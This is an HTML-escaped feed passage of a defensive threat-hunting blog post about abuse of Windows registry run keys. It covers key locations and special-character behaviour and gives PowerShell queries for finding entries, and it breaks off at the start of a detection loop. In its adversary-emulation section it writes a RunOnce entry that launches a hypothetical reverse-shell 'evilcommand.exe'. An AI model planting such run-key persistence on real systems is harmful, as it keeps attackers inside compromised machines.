      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;By Dray Agha&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Jumpsec_icons_Physical-security-2.png&#34; alt=&#34;Jumpsec icons Physical security 2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The Windows registry is a vast and complex topic and cannot be understood and defended in one article. One particular area of interest from a security perspective is registry run keys. In this article, we discuss who uses run keys, how to uncover abuse, and how to eradicate evil from them. &lt;/p&gt;
&lt;h2&gt;An Introduction to Run Keys&lt;span class=&#34;absolute -mt-20&#34; id=&#34;an-introduction-to-run-keys&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#an-introduction-to-run-keys&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;What are registry run keys?&lt;/em&gt;&lt;/strong&gt; Run keys are an obscure mechanism of the registry to execute something on a Windows system when a user logs in or the machine boots up. &lt;/p&gt;
&lt;p&gt;A number of advanced adversaries have abused run keys due to their problematic nature. For example, &lt;a href=&#34;https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Fancy Bear&lt;/strong&gt;&lt;/a&gt; (also known as &lt;a href=&#34;https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;APT28&lt;/strong&gt;&lt;/a&gt;), &lt;a href=&#34;https://www.proofpoint.com/us/blog/threat-insight/i-knew-you-were-trouble-ta456-targets-defense-contractor-alluring-social-media&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;TA456&lt;/strong&gt;&lt;/a&gt;, and &lt;a href=&#34;https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Group 123&lt;/strong&gt;&lt;/a&gt; enjoy weaponizing run keys to achieve persistent access to a compromised network. Run keys have housed all manner of malicious content - from simple executables to macro-riddled spreadsheets.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK® records this particular persistence tactic as the sub-technique &lt;a href=&#34;https://attack.mitre.org/techniques/T1547/001/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;T1547.001&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt; It is not a super common technique for adversarial campaigns, however it can offer ardent persistence - all the more reason for you and I to explore this obscurity further. &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_16-53.png&#34; alt=&#34;2021 07 28 16 53&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Though advanced attackers abuse run keys on occasion, &lt;strong&gt;I find it is a mechanism that is not discussed widely enough, even though it is quite straightforward to query run keys for evil.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;The silence on this registry capability isn’t from technical gaps across the infosec community. &lt;strong&gt;Rather, run keys are an unexpected executable component of the ‘config database’ that is the Windows registry.&lt;/strong&gt; This means they often don’t get the same level of attention compared to bigger, more well-known attacker techniques and OS components. However, I recently came across this interesting snippet on the infosec social circuit:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-02_17-15.png&#34; alt=&#34;2021 08 02 17 15&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Before we get into how to hunt for malicious run keys, &lt;strong&gt;let’s detour down the Windows registry.&lt;/strong&gt; &lt;/p&gt;
&lt;h2&gt;The Windows Registry&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-windows-registry&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-windows-registry&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The Windows registry is a labyrinthine place. On the surface it presents itself as a &lt;a href=&#34;https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;centralised database&lt;/strong&gt;&lt;/a&gt; to store information pertaining to user and machine settings. &lt;strong&gt;The reality is that it’s more a menagerie of weird and wonderful capabilities&lt;/strong&gt; that Microsoft sometimes obscurely document, despite these capabilities possessing devastating potential.&lt;/p&gt;
&lt;p&gt;I could spend hours writing about the inconsistencies and capriciousness of the Windows registry. Trying to understand the limits and parameters of its potential is truly maddening. It seems like the byzantine &lt;strong&gt;nature of the registry offers an adversary an unfair advantage&lt;/strong&gt; to stash away their persistence mechanisms and skulk outside the network until the Blue Team has averted their gaze. &lt;/p&gt;
&lt;p&gt;Trying to decipher what is benign and what is malevolent in the windows registry can be considered Sisyphean, especially during an incident.&lt;/p&gt;
&lt;h2&gt;Run keys&lt;span class=&#34;absolute -mt-20&#34; id=&#34;run-keys&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#run-keys&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I hope so far I have conveyed just how difficult it is to tame the registry. To make matters worse, run key capabilities are criminally under-documented by Microsoft, who &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;devote a mere six paragraphs&lt;/strong&gt;&lt;/a&gt; to them.&lt;/p&gt;
&lt;p&gt;Run keys live in the registry. They are configurable to allow a program to execute when a user logs in or the computer is turned on.  “&lt;em&gt;But hold on!&lt;/em&gt;”, I hear you angrily cry, “&lt;em&gt;Windows already has a&lt;/em&gt; &lt;strong&gt;&lt;em&gt;Task Scheduler&lt;/em&gt;&lt;/strong&gt;, &lt;em&gt;THAT’S how you schedule tasks!!!&lt;/em&gt;”&lt;/p&gt;
&lt;p&gt;Well, not according to our Lord and Saviour Bill Gates. Moreover, run keys have some crucial differences that make comparisons to Windows’ &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Task Scheduler&lt;/strong&gt;&lt;/a&gt; somewhat limited.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/memes-1.png&#34; alt=&#34;memes 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;In contrast to Windows Task Scheduler, &lt;strong&gt;registry run keys possess a number of unique characteristics&lt;/strong&gt;:&lt;/p&gt;
&lt;h3&gt;Character Limitations&lt;span class=&#34;absolute -mt-20&#34; id=&#34;character-limitations&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#character-limitations&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Run keys can only store commands that are less than 280 characters.&lt;/strong&gt; So an adversaries’ one-liner must form as few characters as a Tweet. I hope Microsoft didn’t intend for THAT to be a low-tier defence mechanism, as your basic script-kiddie reverse shell will barely cost you 50 characters. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_15-43.png&#34; alt=&#34;2021 07 28 15 43&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Moreover, compiling your own malicious executable and firing it off via the run keys will cost you very few characters but achieve maximum effect. So whilst the character limitation is unique compared to other system timers, it’s a trivial obstacle. &lt;/p&gt;
&lt;h3&gt;Special Character Behaviour&lt;span class=&#34;absolute -mt-20&#34; id=&#34;special-character-behaviour&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#special-character-behaviour&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Another unique feature of run key considers how special characters change the behaviour of the scheduled command.&lt;/strong&gt; Specifically, the &lt;strong&gt;exclamation mark&lt;/strong&gt;  ( ! ) and the &lt;strong&gt;asterisk /&lt;/strong&gt; &lt;strong&gt;wildcard&lt;/strong&gt; ( * ). By default, the run key wipes itself after execution - whether it fails to execute its task or not. These two special characters can be deployed to alter this behaviour.&lt;/p&gt;
&lt;p&gt;If, on your next threat hunting session or incident response, you see this bad boy right here with an exclamation mark, you have encountered a run key that will persist until it has run its allocated command for sure. &lt;strong&gt;If for whatever reason the evil command does not run, the exclamation mark ensures that it will not delete itself until it runs successfully.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-24.png&#34; alt=&#34;2021 07 28 09 24&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The prefixed exclamation of a run key can be defeated by booting the computer in Safe Mode.&lt;/strong&gt; To ensure that a run key is executed regardless of boot mode, &lt;strong&gt;an adversary can leverage an asterisk / wildcard which forces the command to run.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-26.png&#34; alt=&#34;2021 07 28 09 26&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Run keys are configured to wipe themselves after running, by default, which means that unless your logging and detection is sharp, these kinds of malicious activities could go by unnoticed, unless you go through the painstaking  process of forensically recovering the image of the machine&lt;/p&gt;
&lt;h1&gt;Hunting Run Keys&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;images/2021-07-28_16-11.png&#34; alt=&#34;2021 07 28 16 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Is this your face right now? This was my face when I first encountered run keys. This may actually be my face all the time, to be honest. &lt;em&gt;#blueteamproblems&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Although run keys may seem complicated and obscure, &lt;strong&gt;I promise you they are anything but.&lt;/strong&gt; They are wonderfully easy to query and monitor, and they show up fabulously in a SIEM when an adversary manipulates their values. &lt;strong&gt;Let’s prove it together.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Finding Run Keys&lt;span class=&#34;absolute -mt-20&#34; id=&#34;finding-run-keys&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#finding-run-keys&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are a number of places where malicious run keys can be deployed. We’re just going to focus on the top four locations, but if you read some &lt;a href=&#34;https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;red team documentation&lt;/strong&gt;&lt;/a&gt; you’ll find some more registry locations to deploy run key persistence. &lt;/p&gt;
&lt;p&gt;Anyway, in the Windows registry, if you look under HKey Local Machine and Current User, and traverse a couple of directories, you’ll find &lt;strong&gt;Run&lt;/strong&gt; and &lt;strong&gt;RunOnce.&lt;/strong&gt; &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;The directories are important here.&lt;/strong&gt; The behaviour of the run key is contingent on the registry location it is written in: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you see something written in &lt;strong&gt;HKLM:\&lt;/strong&gt; it means this was written as a &lt;strong&gt;high-privileged&lt;/strong&gt; user (most likely Admin) or SYSTEM.
&lt;ul&gt;
&lt;li&gt;Run keys written here can &lt;strong&gt;execute when the machine boots up&lt;/strong&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If you see something something written in &lt;strong&gt;HKCU:\&lt;/strong&gt; it means this was written as just a &lt;strong&gt;normal user&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Run keys written here will &lt;strong&gt;only execute when the user logs in&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If you see something written to &lt;strong&gt;\RunOnce&lt;/strong&gt; it &lt;strong&gt;will&lt;/strong&gt; be removed after execution&lt;/li&gt;
&lt;li&gt;If you see something written in &lt;strong&gt;\Run&lt;/strong&gt; it &lt;strong&gt;will not&lt;/strong&gt; be removed after execution
&lt;ul&gt;
&lt;li&gt;These can be complicated by the &lt;strong&gt;special character behaviour&lt;/strong&gt; that we already discussed.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;What do Run Keys look like IRL ?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;what-do-run-keys-look-like-irl-&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#what-do-run-keys-look-like-irl-&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In real life, you actually have to sift a little bit of the registry’s noise to get to the meat of a run key.&lt;/strong&gt; Allow me to share with you two examples, where the first has not been filtered with PowerShell, and the second is enjoying a luxurious yet temporal life as filtered PowerShell.&lt;/p&gt;
&lt;p&gt;Look at this mess. What even is this? &lt;strong&gt;We don’t even need the stuff highlighted in the red box, it’s just noise.&lt;/strong&gt; We know this is the ‘HKLM’ Drive and ‘Run’ ChildName…&amp;hellip;we know that because we are the ones who traversed here! Honestly…&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_17-20-1024x349.png&#34; alt=&#34;2021 07 28 17 20&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Let’s filter out the noise with some PowerShell:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fl&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/124326535-76c64680-db7e-11eb-9b98-261b3704d30a.png&#34; alt=&#34;124326535 76c64680 db7e 11eb 9b98 261b3704d30a&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Look at how superior this is. Imagine running this glorious filtered-one-liner, and getting thousands of endpoints returning information in this kind of clear, noise-free way; the stuff Blue Team dreams are made of. &lt;strong&gt;This kind of filtered PowerShell is fantastically suited to be run enterprise-wide to identify anomalies beyond the standard builds across your network.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;If you look in the run keys, you&amp;rsquo;ll find the entries’ name and accompanying commands &lt;em&gt;(name: command).&lt;/em&gt; The legitimate contents of the run keys can vary and it’s your task to understand what is normal in your enterprise, as this will allow abnormal inconsistencies to stand out. &lt;/p&gt;
&lt;p&gt;As you hunt, you may want to filter out legitimate startup items in the registry runkeys. This is easily done. Using the same PowerShell as above, we can use the `-exclude` flag which already removes `PS*`. Just add a comma, and remove the other run key names that you don’t want to see. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-property&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exclude&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Vmware&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bginfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fl&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-08-03_16-21.png&#34; alt=&#34;2021 08 03 16 21&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Malicious Run Keys&lt;span class=&#34;absolute -mt-20&#34; id=&#34;malicious-run-keys&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#malicious-run-keys&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let us emulate some of the adversaries&amp;rsquo; behaviour. We will insert some malice onto a run key, and then I will show you:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;First,&lt;/strong&gt; how to loop through and find it automatically;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Second,&lt;/strong&gt; how you eradicate it from the machine without damaging the other legitimate run keys.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Pretend we have pwned a machine, and are looking to maintain persistence. We compile evilcommand.exe, which bypasses all anti-virus known to man and gives us a reverse shell. &lt;strong&gt;We can force one of the run keys to execute our malicious program&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Set-ItemProperty&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;!Delete After Running&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Value&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;evilcommand.exe&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;If you append `-whatif` to the end of a lot of powershell one-liners, it will not actually run your command. Instead, it will show you what the effect COULD be if you ran it. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-04-1024x110.png&#34; alt=&#34;2021 07 28 09 04&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;When you want to really run something, tag on `-verbose` so you can get confirmation that the PowerShell you expected has taken effect.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-06-1024x128.png&#34; alt=&#34;2021 07 28 09 06&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Without all of the noise, this is what we have forcibly co-opted the run key to do for us: we have created a run key named “&lt;strong&gt;Delete_After_Running&lt;/strong&gt;”, whose execution &lt;strong&gt;value&lt;/strong&gt; will be “&lt;strong&gt;evilcommand.exe&lt;/strong&gt;”. Notice the &lt;strong&gt;exclamation point&lt;/strong&gt;, which as we have discussed will ensure the program will run before it self-deletes, guaranteeing our successful re-entry to this compromised machine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_09-11-1024x142.png&#34; alt=&#34;2021 07 28 09 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The Task Scheduler is oblivious to this&lt;/strong&gt;. It does not and cannot recognise that this run key task has been scheduled. If I were Microsoft, I’d probably include that functionality in Task Scheduler…&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_15-36-1024x491.png&#34; alt=&#34;2021 07 28 15 36&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Finding Run Key evil&lt;span class=&#34;absolute -mt-20&#34; id=&#34;finding-run-key-evil&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#finding-run-key-evil&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A quick Powershell ‘for loop’ can collect the contents of these four registry locations.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;When drafting this script, I (and now you, too) made life easier by ensuring the code produced output that was &lt;strong&gt;pre-filtered and added colours&lt;/strong&gt;. This will make our task that bit easier to determine &lt;strong&gt;IF&lt;/strong&gt; something &lt;strong&gt;abnormal&lt;/strong&gt; (read: evil) exists and &lt;strong&gt;WHERE&lt;/strong&gt; it exists.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$items&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$items&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
